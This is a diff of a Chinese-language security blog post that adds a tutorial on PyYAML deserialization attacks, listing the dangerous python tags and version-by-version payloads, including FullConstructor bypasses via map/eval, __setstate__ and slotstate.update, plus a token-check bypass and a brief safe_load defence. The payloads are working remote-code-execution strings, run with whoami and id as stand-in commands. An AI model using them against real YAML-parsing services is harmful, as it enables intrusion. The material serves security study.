@@ -26,10 +26,10 @@
 <meta property="og:image" content="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8d42331c-e3bd-4620-af91-f6c797f8117e.png!blog">
 <meta property="og:image" content="http://example.com/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230519193611913.png">
 <meta property="article:published_time" content="2023-05-17T02:35:55.000Z">
-<meta property="article:modified_time" content="2023-05-19T12:12:17.338Z">
+<meta property="article:modified_time" content="2023-05-22T08:35:01.558Z">
 <meta property="article:author" content="springtime">
-<meta property="article:tag" content="PyYaml">
 <meta property="article:tag" content="python安全">
+<meta property="article:tag" content="PyYaml">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8d42331c-e3bd-4620-af91-f6c797f8117e.png!blog">
   
@@ -285,7 +285,7 @@
 <thead>
 <tr>
 <th align="center">tag</th>
-<th align="center">use</th>
+<th align="center">expression</th>
 </tr>
 </thead>
 <tbody><tr>
@@ -310,7 +310,140 @@
 </tr>
 </tbody></table>
 <p>很明显这五种tag都可以引入新的模块，导致PyYAML存在被反序列化攻击的可能。</p>
-<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="PyYAML-lt-5-1"><a href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML &lt; 5.1"></a>PyYAML &lt; 5.1</h2><h2 id="PyYAML-x3D-5-1"><a href="#PyYAML-x3D-5-1" class="headerlink" title="PyYAML &#x3D; 5.1"></a>PyYAML &#x3D; 5.1</h2><h2 id="PyYAML-x3D-5-2"><a href="#PyYAML-x3D-5-2" class="headerlink" title="PyYAML &#x3D; 5.2"></a>PyYAML &#x3D; 5.2</h2><h2 id="PyYAML-x3D-5-3-1"><a href="#PyYAML-x3D-5-3-1" class="headerlink" title="PyYAML &#x3D; 5.3.1"></a>PyYAML &#x3D; 5.3.1</h2><h2 id="PyYAML-x3D-5-4"><a href="#PyYAML-x3D-5-4" class="headerlink" title="PyYAML &#x3D; 5.4"></a>PyYAML &#x3D; 5.4</h2><h2 id="PyYAML-x3D-6-0"><a href="#PyYAML-x3D-6-0" class="headerlink" title="PyYAML &#x3D; 6.0"></a>PyYAML &#x3D; 6.0</h2><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="YAML语法"><a href="#YAML语法" class="headerlink" title="YAML语法"></a>YAML语法</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul>
+<p>下面逐一介绍高级类型转换中的五个标签。</p>
+<h2 id="危险标签"><a href="#危险标签" class="headerlink" title="危险标签"></a>危险标签</h2><h3 id="python-x2F-object-x2F-apply"><a href="#python-x2F-object-x2F-apply" class="headerlink" title="python&#x2F;object&#x2F;apply"></a>python&#x2F;object&#x2F;apply</h3><p>对应<code>construct_python_object_apply</code>，它可以引入模块中的方法并执行，可以传入参数并且以列表的方式提供：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#以下几种写法等价</span><br>yaml.load(<span class="hljs-string">&#x27;exp: !!python/object/apply:os.system [&quot;whoami&quot;]&#x27;</span>)<br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [whoami]&quot;</span>) <span class="hljs-comment">#引号可省略</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  args: [&quot;whoami&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]: exp&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="python-x2F-object-x2F-new"><a href="#python-x2F-object-x2F-new" class="headerlink" title="python&#x2F;object&#x2F;new"></a>python&#x2F;object&#x2F;new</h3><p>与<code>python/object/apply</code><strong>基本等价</strong>，对应函数<code>construct_python_object_new</code>，payload也相同。</p>
+<h3 id="python-x2F-object"><a href="#python-x2F-object" class="headerlink" title="python&#x2F;object"></a>python&#x2F;object</h3><p>对应函数<code>construct_python_object</code>，可以调用构造函数但无法传参。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;!!python/object:builtins.copyright&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="python-x2F-module"><a href="#python-x2F-module" class="headerlink" title="python&#x2F;module"></a>python&#x2F;module</h3><p>对应函数<code>construct_python_module</code>，后续调用<code>find_python_module</code>，也就是<code>import</code>，一般情况下<code>import</code>导入模块不会执行py文件里的代码，除了命名空间<code>__name__ == &quot;__main__&quot;</code>的代码部分。这时候想要利用这个标签RCE，自然会联想到结合任意文件上传，那么这就有点类似于php的文件包含了，不过后缀必须是py。举个例子存在如下flask项目：</p>
+<blockquote>
+<p>├── app.py<br>├── static<br>├── templates<br>│   └── index.html<br>└── uploads<br>   ├── exp.py<br>   └── info.py</p>
+</blockquote>
+<p>app.py中包含如下利用代码：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;!!python/module:uploads.exp&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>exp.py为恶意模块</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;id&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>然后执行app.py就可以实现rce。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 app.py<br><span class="hljs-comment">#uid=1000(spring) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure>
+
+<p>或者可以上传<code>__init__.py</code>至uploads文件夹，不需要指定包名就可以直接触发：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;!!python/module:uploads&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="python-x2F-name"><a href="#python-x2F-name" class="headerlink" title="python&#x2F;name"></a>python&#x2F;name</h3><p>对应函数是<code>construct_python_name</code>，后续调用<code>find_python_name</code>，他返回模块下面的属性或方法。它可以用于以下特殊场景：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml<br><br>TOKEN = <span class="hljs-string">&quot;Y0u_Nev3r_kn0w.&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">config</span>):<br>    <span class="hljs-keyword">try</span>:<br>        token = yaml.load(config).get(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        token = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> token == TOKEN:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes, master.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fuck off!&quot;</span>)<br><br>config = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 可控输入点</span><br>check(config)<br></code></pre></td></tr></table></figure>
+
+<p>这时将payload设置为<code>token=!!python/name:__main__.TOKEN</code>，就可以绕过对于token的check，前提是<strong>需要知道变量名</strong>是<code>token</code>，当然这种情况下直接RCE也是可以的。</p>
+<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="PyYAML-lt-5-1"><a href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML &lt; 5.1"></a>PyYAML &lt; 5.1</h2><blockquote>
+<p>默认构造器：Constructor</p>
+<p>不支持标签：无，全部支持。</p>
+</blockquote>
+<p>版本小于5.1提供两个方法解析YAML：</p>
+<ul>
+<li><code>yaml.load</code>：加载单个YAML文件</li>
+<li><code>yaml.load_all</code>：加载多个YAML文件</li>
+</ul>
+<p>两者都可以指定构造器<code>Loader</code>，此版本下构造器有三种：</p>
+<ul>
+<li><code>BaseConstructor</code>：基础构造器，不支持类型转换。</li>
+<li><code>SafeConstructor</code>：集成BaseConstructor，同时类型转换和YAML规范一致，不支持<code>complex python tags</code>。</li>
+<li><code>Constructor</code>：在YAML规范基础上新增<code>complex python tags</code>。</li>
+</ul>
+<p>支持complex python tags的Constructor构造器是最危险的构造器，同时<strong>它也是在此版本下默认使用的</strong>。</p>
+<p>此版本下五种标签看情况选择即可。</p>
+<h2 id="PyYAML-x3D-5-1"><a href="#PyYAML-x3D-5-1" class="headerlink" title="PyYAML &#x3D; 5.1"></a>PyYAML &#x3D; 5.1</h2><blockquote>
+<p>默认构造器：FullConstructor</p>
+<p>不支持标签：无，全部支持。</p>
+</blockquote>
+<p>此版本下的构造器有：</p>
+<ul>
+<li><code>BaseConstructor</code>：没有任何强制类型转换</li>
+<li><code>SafeConstructor</code>：只有基础类型的强制类型转换</li>
+<li><code>FullConstructor</code>：除了 <code>python/object/apply</code> 之外都支持，但是加载的模块必须位于 <code>sys.modules</code> 中（说明已经主动 import 过了才让加载）。这个是默认的构造器。</li>
+<li><code>UnsafeConstructor</code>：支持全部的强制类型转换</li>
+<li><code>Constructor</code>：等同于 <code>UnsafeConstructor</code></li>
+</ul>
+<p>同时，新增了几个加载方法：</p>
+<ul>
+<li><code>yaml.full_load</code></li>
+<li><code>yaml.full_load_all</code></li>
+<li><code>yaml.unsafe_load</code></li>
+<li><code>yaml.unsafe_load_all</code></li>
+</ul>
+<h3 id="不使用FullConstructor"><a href="#不使用FullConstructor" class="headerlink" title="不使用FullConstructor"></a>不使用FullConstructor</h3><p>这种情况下和版本小于5.1的利用方式相同，但构造器必须是<code>UnsafeConstructor</code>、<code>Constructor</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.unsafe_load(exp)<br>yaml.load(exp, Loader=UnsafeLoader)<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="突破FullConstructor"><a href="#突破FullConstructor" class="headerlink" title="突破FullConstructor"></a>突破FullConstructor</h3><p><strong>goal：</strong>触发带参数调用+引入函数</p>
+<p>FullConstructor只允许加载<code>sys.modules</code>中的模块，也就是import过的，总结来说利用过程中需要解决如下限制：</p>
+<ol>
+<li>只引用，不执行的限制：<ul>
+<li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li>
+</ul>
+</li>
+<li>引用并执行：<ul>
+<li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li>
+<li>FullConstructor 下，<code>unsafe = False</code>，加载进来的 <code>module.name</code> 必须是一个类</li>
+</ul>
+</li>
+</ol>
+<p>两个不行的例子：</p>
+<ol>
+<li><code>!!python/name:pickle.loads</code>：<code>pickle</code> 不在 <code>sys.modules</code> 中</li>
+<li><code>!!python/object/new:builtins.eval [&quot;print(1)&quot;]</code>：<code>eval</code> 虽然在 <code>sys.modules</code> 中，但是 <code>type(builtins.eval)</code> 是 <code>builtin_function_or_method</code> 而不是一个类。</li>
+</ol>
+<h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h4><p>满足位于<code>sys.modules</code>，同时可以执行命令的类就是<code>subprocess.Popen</code>，因此使用apply标签的payload就是：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:subprocess.Popen</span><br><span class="hljs-string">  - whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="map"><a href="#map" class="headerlink" title="map()"></a>map()</h4><p>不使用apply标签，在builtins内置模块中还有<code>map</code>、<code>filter</code>等可以触发函数执行。类可以通过<code>python/object/new</code>引入，而函数可以通过<code>python/name</code>引入，最后的payload就是：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:tuple</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="listitems-extend"><a href="#listitems-extend" class="headerlink" title="listitems.extend()"></a>listitems.extend()</h4><p>使用<code>FullConstructor</code>加载YAML的同时，会调用<code>construct_python_object_apply</code>，而它不仅进行了实例化，如果有<code>listitems</code>还会调用实例中的<code>extend</code>属性指定的方法，比如：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;exp&quot;</span>, (), &#123;<span class="hljs-string">&quot;extend&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>exp.extend(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>因此转换成YAML就是：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - exp</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="hljs-string">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="setstate-state"><a href="#setstate-state" class="headerlink" title="__setstate__(state)"></a>__setstate__(state)</h4><p>除了<code>extend</code>，<code>construct_python_object_apply</code>还会调用<code>setstate</code>，对于这个利用方式picke反序列化中已经提到：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;exp&quot;</span>, (<span class="hljs-built_in">list</span>, ), &#123;<span class="hljs-string">&quot;__setstate__&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>exp.__setstate__(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>转换成YAML：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - exp</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;__setstate__&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="slotstate-update"><a href="#slotstate-update" class="headerlink" title="slotstate.update()"></a>slotstate.update()</h4><p><code>type</code>可以用 <code>staticmethod</code> 来替换，<code>set_python_instance_state</code> 中存在调用：<code>slotstate.update()</code>，只需要将<code>slotstate.update</code> 赋值为 <code>eval</code>，<code>state</code>赋值为payload即可：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">staticmethod</span>([<span class="hljs-number">0</span>])<br>exp.__dict__.update(<br>    &#123;<span class="hljs-string">&quot;update&quot;</span>: <span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;items&quot;</span>: <span class="hljs-built_in">list</span>&#125;<br>)<br>exp_raise = <span class="hljs-built_in">str</span>()<br><span class="hljs-comment"># 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用</span><br><br>exp.update(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>转换成YAML就是：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:str</span><br><span class="hljs-string">    args: []</span><br><span class="hljs-string">    # 通过 state 触发调用</span><br><span class="hljs-string">    state: !!python/tuple</span><br><span class="hljs-string">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">      # 下面构造 exp</span><br><span class="hljs-string">      - !!python/object/new:staticmethod</span><br><span class="hljs-string">        args: []</span><br><span class="hljs-string">        state: </span><br><span class="hljs-string">          update: !!python/name:eval</span><br><span class="hljs-string">          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="PyYAML-x3D-5-2"><a href="#PyYAML-x3D-5-2" class="headerlink" title="PyYAML &#x3D; 5.2"></a>PyYAML &#x3D; 5.2</h2><blockquote>
+<p>默认构造器：FullConstructor</p>
+<p>不支持标签：python&#x2F;object&#x2F;apply</p>
+</blockquote>
+<h2 id="PyYAML-x3D-5-3-1"><a href="#PyYAML-x3D-5-3-1" class="headerlink" title="PyYAML &#x3D; 5.3.1"></a>PyYAML &#x3D; 5.3.1</h2><blockquote>
+<p>默认构造器：FullConstructor</p>
+<p>不支持标签：python&#x2F;object&#x2F;apply</p>
+<p>引入了属性名黑名单：<a target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386">https://github.com/yaml/pyyaml/pull/386</a></p>
+</blockquote>
+<h2 id="PyYAML-x3D-5-4"><a href="#PyYAML-x3D-5-4" class="headerlink" title="PyYAML &#x3D; 5.4"></a>PyYAML &#x3D; 5.4</h2><blockquote>
+<p>默认构造器：FullConstructor</p>
+<p>不支持标签：python&#x2F;object&#x2F;apply、python&#x2F;object、python&#x2F;object&#x2F;new、python&#x2F;module</p>
+<p>仅支持：python&#x2F;name</p>
+</blockquote>
+<h2 id="PyYAML-x3D-6-0"><a href="#PyYAML-x3D-6-0" class="headerlink" title="PyYAML &#x3D; 6.0"></a>PyYAML &#x3D; 6.0</h2><blockquote>
+<p>默认构造器：无默认构造器，使用<code>yaml.load()</code>时必须指定参数Loader。</p>
+<p>不支持标签：python&#x2F;object&#x2F;apply、python&#x2F;object、python&#x2F;object&#x2F;new、python&#x2F;module</p>
+<p>仅支持：python&#x2F;name</p>
+</blockquote>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>使用<code>yaml.safe_load()</code>即可。</p>
+<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="YAML语法"><a href="#YAML语法" class="headerlink" title="YAML语法"></a>YAML语法</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul>
 <li>大小写敏感</li>
 <li>使用缩进表示层级关系</li>
 <li>缩进不允许使用tab，只允许空格</li>
@@ -329,8 +462,6 @@
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">boolean:</span> <br>    <span class="hljs-bullet">-</span> <span class="hljs-literal">TRUE</span>  <span class="hljs-comment">#true,True都可以</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-literal">FALSE</span>  <span class="hljs-comment">#false，False都可以</span><br><span class="hljs-attr">float:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">3.14</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">6.8523015e+5</span>  <span class="hljs-comment">#可以使用科学计数法</span><br><span class="hljs-attr">int:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">123</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">0b1010_0111_0100_1010_1110</span>    <span class="hljs-comment">#二进制表示</span><br><span class="hljs-attr">null:</span><br>    <span class="hljs-attr">nodeName:</span> <span class="hljs-string">&#x27;node&#x27;</span><br>    <span class="hljs-attr">parent:</span> <span class="hljs-string">~</span>  <span class="hljs-comment">#使用~表示null</span><br><span class="hljs-attr">string:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">哈哈</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;Hello world&#x27;</span>  <span class="hljs-comment">#可以使用双引号或者单引号包裹特殊字符</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">newline</span><br>      <span class="hljs-string">newline2</span>    <span class="hljs-comment">#字符串可以拆成多行，每一行会被转化成一个空格</span><br><span class="hljs-attr">date:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">2018-02-17</span>    <span class="hljs-comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span><br><span class="hljs-attr">datetime:</span> <br>    <span class="hljs-bullet">-</span>  <span class="hljs-number">2018-02-17T15:02:31+08:00</span>    <span class="hljs-comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><br></code></pre></td></tr></table></figure></li>
 </ul>
 <h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># &amp; 用来建立锚点（defaults），&lt;&lt; 表示合并到当前数据，* 用来引用锚点</span><br><span class="hljs-attr">defaults:</span> <span class="hljs-meta">&amp;defaults</span><br>  <span class="hljs-attr">adapter:</span>  <span class="hljs-string">postgres</span><br>  <span class="hljs-attr">host:</span>     <span class="hljs-string">localhost</span><br><span class="hljs-attr">test:</span><br>  <span class="hljs-attr">database:</span> <span class="hljs-string">myapp_test</span><br>  <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*defaults</span><br> <br><span class="hljs-comment">#相当于：</span><br><br><span class="hljs-attr">defaults:</span><br>  <span class="hljs-attr">adapter:</span>  <span class="hljs-string">postgres</span><br>  <span class="hljs-attr">host:</span>     <span class="hljs-string">localhost</span><br><span class="hljs-attr">test:</span><br>  <span class="hljs-attr">database:</span> <span class="hljs-string">myapp_test</span><br>  <span class="hljs-attr">adapter:</span>  <span class="hljs-string">postgres</span><br>  <span class="hljs-attr">host:</span>     <span class="hljs-string">localhost</span><br>  <br></code></pre></td></tr></table></figure>
-
-
 
 <h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">SecMap - 反序列化（PyYAML） - Tr0y’s Blog</a></p>
 <p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/PyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://boogipop.com/2023/03/02/PyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p>
@@ -368,9 +499,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/PyYaml/">#PyYaml</a>
-      
         <a href="/tags/python%E5%AE%89%E5%85%A8/">#python安全</a>
+      
+        <a href="/tags/PyYaml/">#PyYaml</a>
       
     </div>
   
